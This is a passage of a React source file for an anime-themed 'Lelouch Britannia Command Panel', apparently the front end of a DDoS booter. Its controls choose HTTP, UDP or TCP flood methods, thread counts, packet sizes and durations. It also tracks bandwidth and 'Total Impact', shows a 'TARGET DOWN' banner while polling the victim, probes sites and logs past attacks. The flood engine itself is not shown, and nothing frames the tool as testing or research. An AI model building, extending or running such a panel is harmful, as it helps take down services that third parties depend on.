                                <span className="lrec-score">{rec.score}/100</span>
                              </div>
                            </div>
                          </div>
                          <button
                            className={`lrec-use ${i === 0 ? "lrec-use--best" : ""}`}
                            onClick={() => {
                              setMethod(rec.method);
                              setThreads(rec.suggestedThreads);
                              setDuration(rec.suggestedDuration);
                              addLog(`♟ Applied: ${rec.name} — ${rec.suggestedThreads} threads, ${rec.suggestedDuration}s [Tier ${rec.tier}]`, "success");
                              if (soundRef.current) playTone("tick");
                              setShowAnalyze(false);
                            }}
                          >
                            USE
                          </button>
                        </div>
                      ))}
                    </div>
                  </>
                )}
              </div>
            )}

            {/* Power level */}
            <div className="lb-power-row">
              <span className="lb-power-label">POWER LEVEL</span>
              <div className="lb-power-bar-track">
                <div className="lb-power-bar-fill" style={{ width: `${pw.pct}%`, background: pw.color }}/>
              </div>
              <span className="lb-power-value" style={{ color: pw.color }}>{pw.label}</span>
            </div>

            {/* Params */}
            <div className="lb-params">
              <div className="lb-field">
                <label>Attack Method</label>
                <select className="lb-select" value={method} onChange={e => setMethod(e.target.value)}>
                  {methods.length === 0
                    ? <><option value="http-flood">HTTP Flood</option><option value="udp-flood">UDP Flood</option><option value="tcp-flood">TCP Flood</option></>
                    : methods.map(m => <option key={m.id} value={m.id}>{m.name}</option>)
                  }
                </select>
              </div>
              <div className="lb-field">
                <label>Packet Size (kb)</label>
                <input className="lb-num" type="number" min={1} max={65535} value={packetSize} onChange={e => setPacketSize(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Duration (s)</label>
                <input className="lb-num" type="number" min={1} max={3600} value={duration} onChange={e => setDuration(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Threads</label>
                <input className="lb-num" type="number" min={1} max={512} value={threads} onChange={e => setThreads(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Packet Delay (ms)</label>
                <input className="lb-num" type="number" min={0} max={10000} value={delay} onChange={e => setDelay(+e.target.value)}/>
              </div>
              <div className="lb-field lb-field--webhook">
                <label className="lb-webhook-toggle" onClick={() => setShowWebhook(v => !v)}>
                  {showWebhook ? "▲" : "▼"} Webhook <span className="lb-opt">optional</span>
                </label>
                {showWebhook && (
                  <input className="lb-num" type="url" placeholder="https://..." value={webhookUrl} onChange={e => setWebhookUrl(e.target.value)}/>
                )}
              </div>
            </div>

            {/* Stats — 4 boxes + sparkline */}
            <div className="lb-stats">
              <div className="lb-stat lb-stat--red">
                <div className="lb-stat-head"><span>⚡</span> Req/sec</div>
                <div className="lb-stat-val">{isRunning ? fmtNum(pps) : "—"}</div>
                {isRunning && peakPps > 0 && (
                  <div className="lb-stat-peak">PEAK {fmtNum(peakPps)}</div>
                )}
              </div>
              <div className="lb-stat lb-stat--gold">
                <div className="lb-stat-head"><span>📶</span> Bandwidth</div>
                <div className="lb-stat-val">{isRunning ? fmtBps(bps) : "—"}</div>
                {isRunning && peakBps > 0 && (
                  <div className="lb-stat-peak">PEAK {fmtBps(peakBps)}</div>
                )}
              </div>
              <div className="lb-stat lb-stat--dim">
                <div className="lb-stat-head"><span>👑</span> Threads</div>
                <div className="lb-stat-val">{isRunning ? threads : "—"}</div>
                {isRunning && (
                  <div className="lb-stat-peak" style={{ color: pw.color }}>{pw.label}</div>
                )}
              </div>
              <div className="lb-stat lb-stat--wide">
                <div className="lb-stat-head"><span>📡</span> Total Impact</div>
                <div className="lb-stat-val lb-stat-val--mono">
                  {fmtNum(totalPackets)} <span className="lb-stat-bytes">({fmtBytes(totalBytes)})</span>
                </div>
              </div>
              {isRunning && ppsHistory.length >= 3 && (
                <div className="lb-sparkline-wrap">
                  <div className="lb-sparkline-label">
                    <span>LIVE TRAFFIC — {method.toUpperCase()}</span>
                    <span className={`lb-method-badge lb-method-badge--${mi.cls}`}>{mi.badge}</span>
                  </div>
                  <Sparkline data={ppsHistory} color={method === "geass-override" ? "#C0392B" : L7_HTTP_FE.has(method) ? "#2ecc71" : L4_TCP_FE.has(method) ? "#3498db" : "#D4AF37"} />
                </div>
              )}
            </div>

            {/* Target status banner — shows during attack */}
            {isRunning && targetStatus !== "unknown" && (
              <div className={`lb-target-status ${targetStatus === "offline" ? "ts-offline" : "ts-online"}`}>
                <span className="ts-dot"/>
                <span className="ts-label">
                  {targetStatus === "online"
                    ? `TARGET ONLINE — ${target} responding`
                    : `💥 TARGET DOWN — ${target} not responding`
                  }
                </span>
                <span className="ts-monitor">Monitoring every 6s</span>
              </div>
            )}

            {/* Progress */}
            <div className="lb-progress-wrap">
              <div className="lb-progress-label">
                <span>Attack Progress</span>
                <span>{Math.round(progress)}%</span>
              </div>
              <div className="lb-progress-track">
                <div className="lb-progress-fill" style={{ width: `${progress}%` }}/>
              </div>
            </div>

            {/* Terminal */}
            <div className="lb-terminal" ref={terminalRef}>
              {logs.map(l => (
                <div key={l.id} className={`lb-line lb-line--${l.type}`}>
                  <span className="lb-prompt">›</span> {l.text}
                </div>
              ))}
            </div>

            {/* Site checker */}
            <section className="lb-checker">
              <h3 className="lb-section-title">♟ Site Status Checker</h3>
              <div className="lb-checker-row">
                <input
                  className="lb-input lb-checker-input"
                  type="text"
                  placeholder="URL to probe (blank = uses target above)"
                  value={checkerUrl}
                  onChange={e => setCheckerUrl(e.target.value)}
                  onKeyDown={e => e.key === "Enter" && handleCheckSite()}
                />
                <button className="lb-checker-btn" onClick={handleCheckSite} disabled={isChecking}>
                  {isChecking ? "Probing..." : "Probe"}
                </button>
              </div>
              {checkerResult && (
                <div className={`lb-checker-result ${checkerResult.up ? "cr-up" : "cr-down"}`}>
                  <span className="cr-dot" style={{ background: statusColor(checkerResult.status) }}/>
                  <span className="cr-code" style={{ color: statusColor(checkerResult.status) }}>
                    {checkerResult.status === 0 ? "OFFLINE" : `HTTP ${checkerResult.status}`}
                  </span>
                  <span className="cr-text">{checkerResult.statusText}</span>
                  <span className="cr-time">{checkerResult.responseTime}ms</span>
                  <span className={`cr-pill ${checkerResult.up ? "cr-pill-up" : "cr-pill-down"}`}>
                    {checkerResult.up ? "ONLINE" : "DOWN"}
                  </span>
                </div>
              )}
            </section>

            {/* Attack history */}
            <section className="lb-history">
              <button className="lb-history-toggle"
                onClick={() => { setShowHistory(v => !v); if (!showHistory) refetchHistory(); }}>
                ♟ Attack History ({allAttacks.length}) {showHistory ? "▲" : "▼"}
              </button>
              {showHistory && (
                <div className="lb-history-list">
                  {allAttacks.length === 0
                    ? <div className="lb-history-empty">No attacks on record.</div>
                    : allAttacks.map(a => (
                      <div key={a.id} className="lb-history-item">
                        <span className="lh-target" title={a.target}>{a.target}</span>
                        <span className="lh-method">{a.method}</span>
                        <span className={`lh-badge lhb-${a.status}`}>{a.status}</span>
                        <span className="lh-pkts">{fmtNum(a.packetsSent ?? 0)} pkts</span>
                        <span className="lh-bytes">{fmtBytes(a.bytesSent ?? 0)}</span>
                      </div>
                    ))
                  }
                </div>
              )}
            </section>
          </div>
        </div>

        <footer className="lb-footer">
          <img src={geassSymbol} className="lb-footer-symbol" alt=""/>
          v2.0 — Lelouch Britannia Command Panel
          <img src={geassSymbol} className="lb-footer-symbol" alt="" aria-hidden="true"/>
        </footer>
        <div className="lb-footer-bar"><div className="lb-footer-fill" style={{ width: `${progress}%` }}/></div>
      </div>

      {/* Mobile FAB */}
      <button
        className={`lb-fab ${isRunning ? "lb-fab--stop" : ""}`}
        onClick={handleLaunch}
        aria-label={isRunning ? "Abort Geass" : "Command Geass"}
      >
        <span className="lb-fab-glyph">♟</span>
        <span className="lb-fab-label">{isRunning ? "ABORT" : "GEASS"}</span>
      </button>
    </div>
  );
}

export default function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <Panel />
    </QueryClientProvider>
  );
}
